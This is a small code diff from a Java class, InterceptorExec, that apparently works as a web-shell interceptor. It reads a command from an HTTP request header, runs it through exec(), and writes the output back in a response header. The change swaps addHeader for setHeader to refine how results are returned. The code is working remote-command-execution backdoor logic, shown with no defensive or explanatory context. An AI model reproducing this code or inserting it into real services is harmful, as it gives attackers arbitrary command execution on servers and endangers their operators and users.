@@ -37,7 +37,7 @@ public class InterceptorExec implements InvocationHandler {
 
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             String result = exec((String) header);
-            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+            invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
             return false;
 //            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
 //            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
